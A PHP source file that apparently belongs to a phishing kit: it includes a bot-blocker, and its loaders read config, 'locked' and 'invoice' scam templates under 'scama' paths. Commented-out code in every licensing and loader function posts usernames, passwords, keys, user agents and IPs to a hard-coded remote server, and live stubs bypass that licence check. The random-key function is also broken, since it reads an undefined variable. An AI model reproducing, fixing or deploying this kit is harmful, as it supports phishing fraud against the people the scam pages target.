<?php

include 'blocker.php';

function login($username,$password) {
 /*
    $get = curl_init();
    $config = parse_ini_file('../key.ini');
    $key = $config['public_key'];
    $key = hex2bin($key);
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $ipnya = user_ip();
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/login_new.php");
    curl_setopt($get, CURLOPT_POST, 1);
    curl_setopt($get, CURLOPT_POSTFIELDS, "username=$username&password=$password&key=$key&ua=$agent&ip_user=$ipnya");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    //return $server_output;
    */
    return 1;
}

function register_key($username,$password,$your_key,$domain) {
    /*
    $get = curl_init();
    $config = parse_ini_file('../key.ini');
    $key = $config['public_key'];
    $key = hex2bin($key);
    $serial = sha1($domain.$public_key);
    $ip = $_SERVER['SERVER_ADDR'];
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/reg_key_new.php");
    curl_setopt($get, CURLOPT_POST, 1);
    curl_setopt($get, CURLOPT_POSTFIELDS, "username=$username&password=$password&key=$key&reg_key=$your_key&ip_reg=$ip&domain=$domain&serial=$serial");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    return $server_output;
    */
    $angka = '0123456789';
    $pjg = strlen($angka);
    $returnkey = '';
    for ($i=0;$i<64;$i++) {
        $returnkey .= $characters[rand(0, $pjg - 1)];
    }
    return $returnkey;
}

function valid_key($domain,$key) {
	/*
    $get = curl_init();
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/check_valid.php");
    curl_setopt($get, CURLOPT_POST, 1);
    curl_setopt($get, CURLOPT_POSTFIELDS, "domain=$domain&key=$key");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    return $server_output;
    */
    return file_get_contents('this.txt');
}

function load_conf() {
	/*
    $get = curl_init();
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/scama/confignew.txt");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    return $server_output;
    */
    return file_get_contents('confignew.txt');
}

function load_locked() {
	/*
    $get = curl_init();
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/scama/locked.txt");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    return $server_output;
    */
    return file_get_contents('locked.txt');
}

function load_invoice() {
	/*
    $get = curl_init();
    curl_setopt($get, CURLOPT_URL,"http://144.217.104.56/api/scama/invoice.txt");
    curl_setopt($get, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($get);
    curl_close($get);
    return $server_output;
    */
    return file_get_contents('invoice.txt');
}

function user_ip()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}